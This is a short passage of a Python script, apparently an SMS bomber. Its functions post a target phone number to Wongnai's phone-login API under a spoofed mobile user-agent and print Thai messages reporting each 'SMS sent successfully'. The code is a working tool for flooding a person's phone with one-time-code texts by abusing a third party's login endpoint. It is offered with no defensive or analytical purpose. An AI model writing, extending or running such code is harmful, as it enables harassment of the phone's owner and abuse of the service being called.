...
def alifecity14():
	...
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")	
def alifecity15():
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")	post("https://www.wongnai.com/_api/guest.json?_v=6.056&locale=th&_a=phoneLogIn",data={"phoneno":phone,"retrycount":"0"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
